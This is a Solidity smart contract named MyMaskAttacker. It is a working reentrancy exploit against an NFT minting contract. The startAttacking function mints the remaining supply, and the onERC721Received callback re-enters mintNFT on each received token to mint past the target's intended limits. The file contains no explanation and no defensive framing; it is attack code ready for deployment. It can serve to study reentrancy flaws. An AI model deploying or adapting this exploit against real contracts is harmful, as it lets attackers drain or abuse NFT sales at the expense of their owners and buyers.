// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IMask {

  

  function mintNFT(uint256 numberOfNfts) external payable;

  function totalSupply() external view returns (uint256);

}

contract MyMaskAttacker {

  // Equals to `bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"))`
  // which can be also obtained as `IERC721Receiver(0).onERC721Received.selector`
  bytes4 private constant _ERC721_RECEIVED = 0x150b7a02;
  uint256 public constant MAX_NFT_SUPPLY = 16384;

  function getMaxSupply() public pure returns (uint256) {
    return MAX_NFT_SUPPLY;
  }

  function getTotalSupply(address target) public view returns (uint256) {
    return IMask(target).totalSupply();
  }

  function getAvailable(address target) public view returns (uint256) {
    uint256 _maxSupply = getMaxSupply();
    uint256 _supply = getTotalSupply(target);
    if (_supply > _maxSupply) {
      return 0;
    }
    return _maxSupply - _supply;
  }

  function startAttacking(address target) external {
    uint256 available = getAvailable(target);
    IMask(target).mintNFT(available);
  }

  function _reEntrancing() internal returns (bytes4) {
    uint256 available = getAvailable(msg.sender);
    if (available > 0) {
      IMask(msg.sender).mintNFT(available);
    }
    return _ERC721_RECEIVED;
  }

  function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4) {
    // too many unused parameters ^^^ XD
    return _reEntrancing();
  }
}